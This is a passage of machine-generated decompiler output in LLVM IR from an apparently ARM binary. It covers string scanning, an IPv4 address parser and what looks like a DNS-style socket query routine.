  uselistorder label %dec_label_pc_129b0._crit_edge, { 1, 0 }
}

define i32 @function_12a24() local_unnamed_addr {
dec_label_pc_12a24:
  %v0_12a24 = load i32, i32* @r0, align 4
  %v1_12a482 = inttoptr i32 %v0_12a24 to i8*
  %v2_12a483 = load i8, i8* %v1_12a482, align 1
  %v3_12a484 = zext i8 %v2_12a483 to i32
  %v2_12a4c5 = icmp eq i8 %v2_12a483, 0
  br i1 %v2_12a4c5, label %dec_label_pc_12a48._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %dec_label_pc_12a24
  %v0_12a54.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_12a2c:                               ; preds = %dec_label_pc_12a34
  %v1_12a3c = add i32 %v0_12a3c, 1
  %v9_12a2c = icmp eq i32 %v3_12a34, %v3_12a486
  br i1 %v9_12a2c, label %dec_label_pc_12a5c, label %dec_label_pc_12a34

dec_label_pc_12a34:                               ; preds = %dec_label_pc_12a2c, %bb
  %v0_12a3c = phi i32 [ %v1_12a3c, %dec_label_pc_12a2c ], [ %v0_12a54.pre, %bb ]
  %v1_12a34 = inttoptr i32 %v0_12a3c to i8*
  %v2_12a34 = load i8, i8* %v1_12a34, align 1
  %v3_12a34 = zext i8 %v2_12a34 to i32
  store i32 %v3_12a34, i32* @ip, align 4
  %v2_12a38 = icmp eq i8 %v2_12a34, 0
  br i1 %v2_12a38, label %dec_label_pc_12a44, label %dec_label_pc_12a2c

dec_label_pc_12a44:                               ; preds = %dec_label_pc_12a34
  %v1_12a44 = add i32 %v0_12a44, 1
  %v1_12a48 = inttoptr i32 %v1_12a44 to i8*
  %v2_12a48 = load i8, i8* %v1_12a48, align 1
  %v3_12a48 = zext i8 %v2_12a48 to i32
  %v2_12a4c = icmp eq i8 %v2_12a48, 0
  br i1 %v2_12a4c, label %dec_label_pc_12a48._crit_edge, label %bb

dec_label_pc_12a48._crit_edge:                    ; preds = %dec_label_pc_12a44, %dec_label_pc_12a24
  %v3_12a48.lcssa = phi i32 [ %v3_12a484, %dec_label_pc_12a24 ], [ %v3_12a48, %dec_label_pc_12a44 ]
  ret i32 %v3_12a48.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_12a44
  %v0_12a44 = phi i32 [ %v0_12a24, %.lr.ph ], [ %v1_12a44, %dec_label_pc_12a44 ]
  %v3_12a486 = phi i32 [ %v3_12a484, %.lr.ph ], [ %v3_12a48, %dec_label_pc_12a44 ]
  br label %dec_label_pc_12a34

dec_label_pc_12a5c:                               ; preds = %dec_label_pc_12a2c
  ret i32 %v0_12a44

; uselistorder directives
  uselistorder i32 %v3_12a48, { 1, 0 }
  uselistorder i32 %v3_12a34, { 1, 0 }
  uselistorder i32 %v0_12a3c, { 1, 0 }
  uselistorder i32 %v3_12a484, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_12a34, { 1, 0 }
}

define i32 @function_12a64(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12a64:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_12a64 = load i32, i32* %r0.global-to-local, align 4
  %v2_12a64 = icmp eq i32 %v0_12a64, 0
  %v3_12a68 = load i32, i32* @r4, align 4
  store i32 %v3_12a68, i32* %stack_var_-20, align 4
  br i1 %v2_12a64, label %dec_label_pc_12b44, label %dec_label_pc_12a80.lr.ph

dec_label_pc_12a80:                               ; preds = %dec_label_pc_12a80.lr.ph, %dec_label_pc_12b04
  %v1_12b04 = phi i32 [ 0, %dec_label_pc_12a80.lr.ph ], [ %v5_12b04, %dec_label_pc_12b04 ]
  %v0_12b08 = phi i32 [ 1, %dec_label_pc_12a80.lr.ph ], [ %v1_12b08, %dec_label_pc_12b04 ]
  %v0_12a88 = phi i32 [ %v0_12a64, %dec_label_pc_12a80.lr.ph ], [ %v0_12a8825, %dec_label_pc_12b04 ]
  store i32 %v2_12a84.pre, i32* @lr, align 4
  %v1_12a88 = inttoptr i32 %v0_12a88 to i8*
  %v2_12a88 = load i8, i8* %v1_12a88, align 1
  %v3_12a88 = zext i8 %v2_12a88 to i32
  %v3_12a8c = mul nuw nsw i32 %v3_12a88, 2
  %v4_12a8c = add i32 %v3_12a8c, %v2_12a84.pre
  %v5_12a8c = inttoptr i32 %v4_12a8c to i8*
  %v6_12a8c = load i8, i8* %v5_12a8c, align 1
  %v1_12a90 = and i8 %v6_12a8c, 8
  %v2_12a90 = icmp eq i8 %v1_12a90, 0
  br i1 %v2_12a90, label %dec_label_pc_12b44, label %dec_label_pc_12a98

dec_label_pc_12a98:                               ; preds = %dec_label_pc_12a80
  br label %dec_label_pc_12ab8

dec_label_pc_12aa0:                               ; preds = %dec_label_pc_12ab8
  %v3_12aa4 = mul i32 %v0_12b04, 10
  %v4_12aa4 = add i32 %v3_12ab8, %v3_12aa4
  %v1_12aa8 = add i32 %v4_12aa4, -48
  %v8_12ab0 = icmp sgt i32 %v1_12aa8, 255
  br i1 %v8_12ab0, label %dec_label_pc_12b44, label %dec_label_pc_12ab4

dec_label_pc_12ab4:                               ; preds = %dec_label_pc_12aa0
  %v1_12ab4 = add i32 %v0_12af4, 1
  store i32 %v1_12ab4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12ab8

dec_label_pc_12ab8:                               ; preds = %dec_label_pc_12a98, %dec_label_pc_12ab4
  %v0_12b04 = phi i32 [ 0, %dec_label_pc_12a98 ], [ %v1_12aa8, %dec_label_pc_12ab4 ]
  %v0_12af4 = phi i32 [ %v0_12a88, %dec_label_pc_12a98 ], [ %v1_12ab4, %dec_label_pc_12ab4 ]
  %v1_12ab8 = inttoptr i32 %v0_12af4 to i8*
  %v2_12ab8 = load i8, i8* %v1_12ab8, align 1
  %v3_12ab8 = zext i8 %v2_12ab8 to i32
  %v2_12abc = mul nuw nsw i32 %v3_12ab8, 2
  %v2_12ac0 = add i32 %v2_12abc, %v2_12a84.pre
  %v3_12ac4 = inttoptr i32 %v2_12ac0 to i8*
  %v4_12ac4 = load i8, i8* %v3_12ac4, align 1
  %v6_12ac4 = zext i8 %v4_12ac4 to i32
  %v1_12ad0 = and i32 %v6_12ac4, 8
  %v2_12ad0 = icmp eq i32 %v1_12ad0, 0
  br i1 %v2_12ad0, label %dec_label_pc_12ad8, label %dec_label_pc_12aa0

dec_label_pc_12ad8:                               ; preds = %dec_label_pc_12ab8
  %v8_12adc = icmp sgt i32 %v0_12b08, 3
  br i1 %v8_12adc, label %dec_label_pc_12af0, label %dec_label_pc_12ae0

dec_label_pc_12ae0:                               ; preds = %dec_label_pc_12ad8
  %v7_12ae0 = icmp eq i8 %v2_12ab8, 46
  br i1 %v7_12ae0, label %dec_label_pc_12ae8, label %dec_label_pc_12b44

dec_label_pc_12ae8:                               ; preds = %dec_label_pc_12ae0
  %v1_12ae8 = add i32 %v0_12af4, 1
  store i32 %v1_12ae8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12b04

dec_label_pc_12af0:                               ; preds = %dec_label_pc_12ad8
  %v2_12af0 = icmp eq i8 %v2_12ab8, 0
  %v1_12af4 = add i32 %v0_12af4, 1
  store i32 %v1_12af4, i32* %r0.global-to-local, align 4
  br i1 %v2_12af0, label %dec_label_pc_12b04, label %dec_label_pc_12afc

dec_label_pc_12afc:                               ; preds = %dec_label_pc_12af0
  %v1_12afc = and i32 %v6_12ac4, 32
  %v2_12afc = icmp eq i32 %v1_12afc, 0
  br i1 %v2_12afc, label %dec_label_pc_12b44, label %dec_label_pc_12b04

dec_label_pc_12b04:                               ; preds = %dec_label_pc_12afc, %dec_label_pc_12af0, %dec_label_pc_12ae8
  %v0_12a8825 = phi i32 [ %v1_12af4, %dec_label_pc_12afc ], [ %v1_12af4, %dec_label_pc_12af0 ], [ %v1_12ae8, %dec_label_pc_12ae8 ]
  %v4_12b04 = mul i32 %v1_12b04, 256
  %v5_12b04 = or i32 %v0_12b04, %v4_12b04
  %v1_12b08 = add nuw nsw i32 %v0_12b08, 1
  %v7_12b10 = icmp slt i32 %v1_12b08, 5
  br i1 %v7_12b10, label %dec_label_pc_12a80, label %dec_label_pc_12b14

dec_label_pc_12a80.lr.ph:                         ; preds = %dec_label_pc_12a64
  %v2_12a84.pre = load i32, i32* @global_var_18428, align 4
  br label %dec_label_pc_12a80

dec_label_pc_12b14:                               ; preds = %dec_label_pc_12b04
  %v2_12b14 = icmp eq i32 %arg2, 0
  br i1 %v2_12b14, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_12b14
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_12b14
  %v3_12b30 = call i32 @llvm.bswap.i32(i32 %v5_12b04)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_12b3c = inttoptr i32 %arg2 to i32*
  store i32 %v3_12b30, i32* %v3_12b3c, align 4
  %v2_12b40.pre = load i32, i32* %stack_var_-20, align 4
  %v17_12b40.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_12b40 = phi i32 [ 1, %bb ], [ %v17_12b40.pre, %bb41 ]
  %v2_12b40 = phi i32 [ %v3_12a68, %bb ], [ %v2_12b40.pre, %bb41 ]
  store i32 %v2_12b40, i32* @r4, align 4
  ret i32 %v17_12b40

dec_label_pc_12b44:                               ; preds = %dec_label_pc_12ae0, %dec_label_pc_12afc, %dec_label_pc_12a80, %dec_label_pc_12aa0, %dec_label_pc_12a64
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_12a68, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_12a84.pre, { 2, 1, 0 }
  uselistorder i32 %v1_12b08, { 1, 0 }
  uselistorder i32 %v0_12af4, { 0, 1, 3, 2 }
  uselistorder i32 %v3_12a68, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 7, 8, 2, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_12b44, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_12ab8, { 1, 0 }
}

define i32 @function_12b50(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_12b50:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp147 = call i32 @__decompiler_undefined_function_0()
  %tmp151 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %tmp157 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_12b50 = load i32, i32* @r4, align 4
  %v6_12b50 = load i32, i32* @r5, align 4
  %v9_12b50 = load i32, i32* @r6, align 4
  %v12_12b50 = load i32, i32* @r7, align 4
  %v15_12b50 = load i32, i32* @r8, align 4
  %v18_12b50 = load i32, i32* @sb, align 4
  %v21_12b50 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_12b70 = call i32 @function_fc78(i32 512)
  store i32 %v1_12b70, i32* @r7, align 4
  %v1_12b7c = call i32 @function_fc78(i32 1025)
  %v2_12b80 = icmp eq i32 %v1_12b7c, 0
  br i1 %v2_12b80, label %.thread8, label %bb

bb:                                               ; preds = %dec_label_pc_12b50
  %v1_12b84 = load i32, i32* @r7, align 4
  %v3_12b84 = icmp eq i32 %v1_12b84, 0
  store i32 %v1_12b7c, i32* %stack_var_-236, align 4
  br i1 %v3_12b84, label %bb195, label %dec_label_pc_12b98

.thread8:                                         ; preds = %dec_label_pc_12b50
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_13278

bb195:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_13278

dec_label_pc_12b98:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_12b9c = icmp eq i32 %arg3, 0
  br i1 %v2_12b9c, label %dec_label_pc_13278, label %dec_label_pc_12ba4

dec_label_pc_12ba4:                               ; preds = %dec_label_pc_12b98
  %v2_12ba8 = load i8, i8* %arg1, align 1
  %v2_12bac = icmp eq i8 %v2_12ba8, 0
  br i1 %v2_12bac, label %dec_label_pc_13278, label %dec_label_pc_12bb4

dec_label_pc_12bb4:                               ; preds = %dec_label_pc_12ba4
  store i32 %tmp, i32* @r0, align 4
  %v0_12bb8 = call i32 @function_f030()
  %v2_12bc0 = add i32 %v0_12bb8, %tmp
  %v1_12bc4 = add i32 %v2_12bc0, -1
  %v2_12bc4 = inttoptr i32 %v1_12bc4 to i8*
  %v3_12bc4 = load i8, i8* %v2_12bc4, align 1
  %v2_12bc8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_12bc8, i32* @r4, align 4
  %v7_12bcc = icmp eq i8 %v3_12bc4, 46
  %. = zext i1 %v7_12bcc to i32
  store i32 %v2_12bc8, i32* @r0, align 4
  %v1_12bf0 = call i32 @function_10d54()
  store i32 76804, i32* @lr, align 4
  %v1_12c00 = call i32 @function_10d4c()
  %v2_12c0c = load i32, i32* @global_var_1aae8.567, align 4
  %v2_12c10 = call i32 @function_cafc(i32 %v2_12c0c, i32 %arg3)
  %v3_12c18 = load i8, i8* @global_var_18435.570, align 1
  %v4_12c18 = zext i8 %v3_12c18 to i32
  %v2_12c1c = load i8, i8* bitcast (i8** @global_var_18434.569 to i8*), align 4
  %v3_12c1c = zext i8 %v2_12c1c to i32
  %v4_12c24 = mul nuw nsw i32 %v4_12c18, 256
  %v5_12c24 = or i32 %v3_12c1c, %v4_12c24
  store i32 %v5_12c24, i32* @sb, align 4
  store i32 %v2_12c10, i32* @sl, align 4
  store i32 %v2_12bc8, i32* @r0, align 4
  %v1_12c38 = call i32 @function_10d54()
  %v0_12c44 = load i32, i32* @r5, align 4
  %v2_12c64 = ptrtoint i8* %stack_var_-188 to i32
  %v6_12ca8 = bitcast i8* %stack_var_-188 to i32*
  %v2_12d88 = ptrtoint i32* %stack_var_-92 to i32
  %v3_12e20 = bitcast i8* %stack_var_-100 to %sockaddr*
  %v10_12e84 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_131d0 = icmp eq i1 %v7_12bcc, false
  %v7_12ed8 = icmp eq i32 %tmp156, 3
  %tmp198 = icmp slt i32 %tmp155, 1
  %v2_12fbc = ptrtoint i32* %stack_var_-140 to i32
  %v9_130b4 = icmp eq i32 %tmp147, %arg2
  %v7_13048 = icmp eq i32 %arg2, 1
  %v2_12ff0 = icmp eq i32 %tmp151, 0
  %tmp292 = icmp ult i32 %v0_12c44, 3
  br i1 %tmp292, label %dec_label_pc_12c4c.lr.ph.preheader.lr.ph, label %dec_label_pc_13284

dec_label_pc_12c4c.lr.ph.preheader.lr.ph:         ; preds = %dec_label_pc_12bb4
  %v2_12f5c = icmp eq i32 %tmp156, 0
  %v8_1304c = icmp eq i32 %arg2, 28
  br label %dec_label_pc_12c4c.lr.ph.preheader

dec_label_pc_12c4c:                               ; preds = %dec_label_pc_12c4c.lr.ph, %dec_label_pc_13268.backedge
  %v1_12c54 = phi i32 [ %stack_var_-216.1.ph84, %dec_label_pc_12c4c.lr.ph ], [ %v3_12dfc, %dec_label_pc_13268.backedge ]
  %stack_var_-208.567 = phi i32 [ %stack_var_-208.5.ph83, %dec_label_pc_12c4c.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_13268.backedge ]
  %v7_12c50 = icmp eq i32 %v1_12c54, -1
  br i1 %v7_12c50, label %bb200, label %bb199

bb199:                                            ; preds = %dec_label_pc_12c4c
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_12c4c, %bb199
  %v1_12c58 = xor i1 %v7_12c50, true
  call void @__pseudo_cond_branch(i1 %v1_12c58, i32 ptrtoint (i32* @global_var_cbe4.572 to i32))
  store i32 512, i32* @r2, align 4
  store i32 %v2_12c64, i32* @r4, align 4
  %v0_12c68 = load i32, i32* @r7, align 4
  %v2_12c6c = inttoptr i32 %v0_12c68 to i8*
  %v3_12c6c = call i32 @function_ef70(i8* %v2_12c6c, i32 0)
  store i32 48, i32* @r2, align 4
  %v3_12c7c = call i32 @function_ef70(i8* nonnull %stack_var_-188, i32 0)
  %v0_12c80 = load i32, i32* @sb, align 4
  %v1_12c80 = add i32 %v0_12c80, 1
  %v3_12c88 = urem i32 %v1_12c80, 65536
  store i32 %v3_12c88, i32* @sb, align 4
  %v0_12c94 = load i32, i32* @r7, align 4
  %v5_12ca0 = trunc i32 %v1_12c80 to i8
  store i8 %v5_12ca0, i8* %stack_var_-188, align 1
  %v7_12ca8 = call i32 @function_143bc(i32* %v6_12ca8, i32 %v0_12c94, i32 512, i32 1, i32 %v1_12c80)
  store i32 %v7_12ca8, i32* @r5, align 4
  %v1_12cac = icmp slt i32 %v7_12ca8, 0
  br i1 %v1_12cac, label %dec_label_pc_13284, label %dec_label_pc_12cb4

dec_label_pc_12cb4:                               ; preds = %bb200
  store i32 %tmp, i32* @r1, align 4
  %v2_12cbc = load i32, i32* %stack_var_-236, align 4
  %v4_12cc0 = call i32 @function_f1d0(i32 %v2_12cbc, i32 %tmp, i32 1025)
  store i32 %v2_12bc8, i32* @r0, align 4
  %v1_12cd8 = call i32 @function_10d54()
  %v1_12ce8 = call i32 @function_10d4c()
  %v1_12cf8 = load i32, i32* @sl, align 4
  %v4_12cf8 = mul i32 %v1_12cf8, 4
  %v5_12cf8 = add i32 %v4_12cf8, %arg4
  %v6_12cf8 = inttoptr i32 %v5_12cf8 to i32*
  %v7_12cf8 = load i32, i32* %v6_12cf8, align 4
  store i32 %v7_12cf8, i32* @r6, align 4
  br i1 %v1_12cf4, label %dec_label_pc_12d3c, label %dec_label_pc_12d00

dec_label_pc_12d00:                               ; preds = %dec_label_pc_12cb4
  %v2_12d08 = load i32, i32* @global_var_1ad48.575, align 4
  %v6_12d10 = icmp slt i32 %v6_1322c, %v2_12d08
  br i1 %v6_12d10, label %dec_label_pc_12d14, label %dec_label_pc_12d3c

dec_label_pc_12d14:                               ; preds = %dec_label_pc_12d00
  store i32 ptrtoint (i32* @global_var_174f0.577 to i32), i32* @r1, align 4
  %v2_12d1c = load i32, i32* %stack_var_-236, align 4
  %v4_12d20 = inttoptr i32 %v2_12d1c to i8*
  %v5_12d20 = call i32 @function_13c04(i8* %v4_12d20, i32 ptrtoint (i32* @global_var_174f0.577 to i32), i32 1025, i32 %v2_12d08)
  %v7_12d30 = load i32, i32* %v6_12d30, align 4
  store i32 %v7_12d30, i32* @r1, align 4
  %v4_12d38 = inttoptr i32 %v2_12d1c to i8*
  %v5_12d38 = call i32 @function_13c04(i8* %v4_12d38, i32 %v7_12d30, i32 1025, i32 ptrtoint (i32* @global_var_1ad28.579 to i32))
  br label %dec_label_pc_12d3c

dec_label_pc_12d3c:                               ; preds = %dec_label_pc_12d00, %dec_label_pc_12cb4, %dec_label_pc_12d14
  store i32 %v2_12bc8, i32* @r0, align 4
  store i32 77136, i32* @lr, align 4
  %v1_12d4c = call i32 @function_10d54()
  %v2_12d58 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_12d58, i32* %stack_var_-56, align 4
  %v0_12d68 = load i32, i32* @r7, align 4
  %v1_12d68 = load i32, i32* @r5, align 4
  %v2_12d68 = add i32 %v1_12d68, %v0_12d68
  %v1_12d6c = sub i32 512, %v1_12d68
  %v8_12d74 = call i32 @function_1455c(i32* nonnull %stack_var_-56, i32 %v2_12d68, i32 %v1_12d6c, i32 %arg2, i32 %v2_12d58, i32 %arg2, i32 1)
  store i32 %v8_12d74, i32* @fp, align 4
  %v1_12d78 = icmp slt i32 %v8_12d74, 0
  br i1 %v1_12d78, label %dec_label_pc_13284, label %dec_label_pc_12d80

dec_label_pc_12d80:                               ; preds = %dec_label_pc_12d3c
  store i32 0, i32* @r4, align 4
  %v0_12d90 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_12d9c = inttoptr i32 %v0_12d90 to i8*
  %v4_12d9c = call i32 @function_13de8(i32 10, i8* %v3_12d9c, i32 %v2_12d88)
  %v1_12da0 = load i32, i32* @r4, align 4
  %v7_12da4 = icmp sgt i32 %v4_12d9c, %v1_12da0
  br i1 %v7_12da4, label %bb201, label %dec_label_pc_12d80..thread11_crit_edge

dec_label_pc_12d80..thread11_crit_edge:           ; preds = %dec_label_pc_12d80
  %v3_12db0.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread11

bb201:                                            ; preds = %dec_label_pc_12d80
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_12d80..thread11_crit_edge, %bb201
  %v3_12db0 = phi i8 [ %v3_12db0.pre, %dec_label_pc_12d80..thread11_crit_edge ], [ 10, %bb201 ]
  %v4_12db0 = sext i8 %v3_12db0 to i32
  %v8_12dac.op = urem i32 %v1_12da0, 256
  %v8_12dac.op.op = mul nuw nsw i32 %v8_12dac.op, 256
  %v4_12db8 = select i1 %v7_12da4, i32 %v8_12dac.op.op, i32 0
  %v5_12db8 = or i32 %v4_12db0, %v4_12db8
  %v7_12dbc = icmp eq i32 %v5_12db8, 10
  br i1 %v7_12dbc, label %dec_label_pc_12de8, label %dec_label_pc_12dd0

dec_label_pc_12dd0:                               ; preds = %.thread11
  %v0_12dd4 = load i32, i32* @r6, align 4
  store i32 %v0_12dd4, i32* @r0, align 4
  %v1_12de0 = call i32 @function_f730(i32 %v0_12dd4)
  %v3_12de8.pre = load i8, i8* %stack_var_-100, align 1
  br label %dec_label_pc_12de8

dec_label_pc_12de8:                               ; preds = %.thread11, %dec_label_pc_12dd0
  %v3_12de8 = phi i8 [ %v3_12de8.pre, %dec_label_pc_12dd0 ], [ %v3_12db0, %.thread11 ]
  %v4_12de8 = sext i8 %v3_12de8 to i32
  %v5_12df8 = or i32 %v4_12de8, %v4_12db8
  %v3_12dfc = call i32 @function_fc4c(i32 %v5_12df8, i32 2, i32 17)
  %v1_12e00 = icmp slt i32 %v3_12dfc, 0
  br i1 %v1_12e00, label %.thread, label %dec_label_pc_12e18

.thread:                                          ; preds = %dec_label_pc_12de8
  br label %dec_label_pc_13268.backedge

dec_label_pc_13268.backedge:                      ; preds = %.thread, %.thread13
  %stack_var_-208.5.be = add i32 %stack_var_-208.567, 1
  %tmp293 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp293, label %dec_label_pc_12c4c, label %dec_label_pc_13284

dec_label_pc_12e18:                               ; preds = %dec_label_pc_12de8
  %v4_12e20 = call i32 @function_fb64(i32 %v3_12dfc, %sockaddr* nonnull %v3_12e20, i32 28)
  %v1_12e24 = icmp slt i32 %v4_12e20, 0
  br i1 %v1_12e24, label %dec_label_pc_12e2c, label %dec_label_pc_12e4c

dec_label_pc_12e2c:                               ; preds = %dec_label_pc_12e18
  %v0_12e2c = call i32 @function_cec4()
  %v1_12e30 = inttoptr i32 %v0_12e2c to i32*
  %v2_12e30 = load i32, i32* %v1_12e30, align 4
  %v7_12e34 = icmp eq i32 %v2_12e30, 101
  br i1 %v7_12e34, label %dec_label_pc_13198, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_12e2c
  br label %dec_label_pc_13268.backedge

dec_label_pc_12e4c:                               ; preds = %dec_label_pc_12e18
  %v0_12e4c = load i32, i32* @r5, align 4
  %v1_12e4c = load i32, i32* @fp, align 4
  %v2_12e4c = add i32 %v1_12e4c, %v0_12e4c
  %v0_12e50 = load i32, i32* @r7, align 4
  %v4_12e5c = inttoptr i32 %v0_12e50 to i32*
  %v5_12e5c = call i32 @function_13678(i32 %v3_12dfc, i32* %v4_12e5c, i32 %v2_12e4c, i32 0)
  store i32 0, i32* @r4, align 4
  store i32 %v3_12dfc, i32* %stack_var_-44, align 4
  %v11_12e84 = call i32 @function_137a4(%pollfd* %v10_12e84, i32 1, i32 10000, i32 1, i32 %v3_12dfc, i32 1, i32 0)
  %v1_12e88 = load i32, i32* @r4, align 4
  %v7_12e8c = icmp sgt i32 %v11_12e84, %v1_12e88
  br i1 %v7_12e8c, label %dec_label_pc_12e90, label %dec_label_pc_13198

dec_label_pc_12e90:                               ; preds = %dec_label_pc_12e4c
  %v0_12e98 = load i32, i32* @r7, align 4
  %v4_12ea0 = inttoptr i32 %v0_12e98 to i32*
  %v5_12ea0 = call i32 @function_fbbc(i32 %v3_12dfc, i32* %v4_12ea0, i32 512, i32 %v1_12e88)
  store i32 %v5_12ea0, i32* @fp, align 4
  %v7_12eac = icmp slt i32 %v5_12ea0, 12
  br i1 %v7_12eac, label %dec_label_pc_131cc, label %dec_label_pc_12eb0

dec_label_pc_12eb0:                               ; preds = %dec_label_pc_12e90
  %v0_12eb0 = load i32, i32* @r7, align 4
  %v2_12eb8 = inttoptr i32 %v0_12eb0 to i8*
  %v3_12eb8 = call i32 @function_144a4(i8* %v2_12eb8, i32 %v2_12c64)
  %v3_12ebc = load i8, i8* %stack_var_-188, align 1
  %v4_12ebc = sext i8 %v3_12ebc to i32
  store i32 %v4_12ebc, i32* @r6, align 4
  %v1_12ec0 = load i32, i32* @sb, align 4
  %v9_12ec0 = icmp eq i32 %v4_12ebc, %v1_12ec0
  br i1 %v9_12ec0, label %dec_label_pc_12ec8, label %dec_label_pc_131cc

dec_label_pc_12ec8:                               ; preds = %dec_label_pc_12eb0
  %v1_12ecc = load i32, i32* @r4, align 4
  %v9_12ecc = icmp eq i32 %tmp157, %v1_12ecc
  br i1 %v9_12ecc, label %dec_label_pc_131cc, label %dec_label_pc_12ed4

dec_label_pc_12ed4:                               ; preds = %dec_label_pc_12ec8
  br i1 %v7_12ed8, label %dec_label_pc_12ee0, label %dec_label_pc_12f5c

dec_label_pc_12ee0:                               ; preds = %dec_label_pc_12ed4
  %v9_12ee4 = icmp eq i32 %., %v1_12ecc
  br i1 %v9_12ee4, label %dec_label_pc_12eec, label %dec_label_pc_12f50

dec_label_pc_12eec:                               ; preds = %dec_label_pc_12ee0
  store i32 %v2_12bc8, i32* @r5, align 4
  store i32 %v2_12bc8, i32* @r0, align 4
  %v1_12f04 = call i32 @function_10d54()
  %v1_12f14 = call i32 @function_10d4c()
  store i32 %v2_12bc8, i32* @r0, align 4
  %v2_12f20 = load i32, i32* @global_var_1ad48.575, align 4
  %v1_12f30 = call i32 @function_10d54()
  %v1_12f38 = add i32 %v2_12f20, -1
  store i32 %v1_12f38, i32* @r4, align 4
  %v5_12f40 = icmp slt i32 %v6_1322c, %v1_12f38
  br i1 %v5_12f40, label %.thread19, label %dec_label_pc_12f50

.thread19:                                        ; preds = %dec_label_pc_12eec
  %v7_12f40 = add i32 %v6_1322c, 1
  %v6_12f44 = load i32, i32* @r6, align 4
  store i32 %v6_12f44, i32* @sb, align 4
  br label %dec_label_pc_13268.outer.backedge

dec_label_pc_12f50:                               ; preds = %dec_label_pc_12eec, %dec_label_pc_12ee0
  %v0_12f50 = call i32 @function_11514()
  br label %dec_label_pc_12f80

dec_label_pc_12f5c:                               ; preds = %dec_label_pc_12ed4
  br i1 %v2_12f5c, label %dec_label_pc_12f64, label %dec_label_pc_131cc

dec_label_pc_12f64:                               ; preds = %dec_label_pc_12f5c
  br i1 %tmp198, label %dec_label_pc_12f78, label %dec_label_pc_12f90.preheader

dec_label_pc_12f90.preheader:                     ; preds = %dec_label_pc_12f64
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_12f90

dec_label_pc_12f78:                               ; preds = %dec_label_pc_12f64
  %v0_12f78 = call i32 @function_11514()
  br label %dec_label_pc_12f80

dec_label_pc_12f80:                               ; preds = %dec_label_pc_12f50, %dec_label_pc_12f78
  %storemerge4 = phi i32 [ %v0_12f78, %dec_label_pc_12f78 ], [ %v0_12f50, %dec_label_pc_12f50 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_12f78 ], [ 1, %dec_label_pc_12f50 ]
  %v2_12f80 = inttoptr i32 %storemerge4 to i32*
  store i32 %storemerge, i32* %v2_12f80, align 4
  br label %dec_label_pc_13294

dec_label_pc_12f88:                               ; preds = %dec_label_pc_12f90
  %v2_12f88 = call i32 @function_145b8(i32 %v0_12f9c, i32 %v0_12f98)
  %v0_12f8c = load i32, i32* @r5, align 4
  %v2_12f8c = add i32 %v0_12f8c, %v2_12f88
  store i32 %v2_12f8c, i32* @r5, align 4
  %v0_12f94.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12f90

dec_label_pc_12f90:                               ; preds = %dec_label_pc_12f90.preheader, %dec_label_pc_12f88
  %v0_12f98 = phi i32 [ 12, %dec_label_pc_12f90.preheader ], [ %v2_12f8c, %dec_label_pc_12f88 ]
  %v0_12fa0 = phi i32 [ 0, %dec_label_pc_12f90.preheader ], [ %v0_12f94.pre, %dec_label_pc_12f88 ]
  store i32 %v0_12f98, i32* @r1, align 4
  %v0_12f9c = load i32, i32* @r7, align 4
  store i32 %v0_12f9c, i32* @r0, align 4
  %v1_12fa0 = add i32 %v0_12fa0, 1
  store i32 %v1_12fa0, i32* @r4, align 4
  %v5_12fa4 = icmp slt i32 %v0_12fa0, 1
  br i1 %v5_12fa4, label %dec_label_pc_12f88, label %dec_label_pc_12fa8

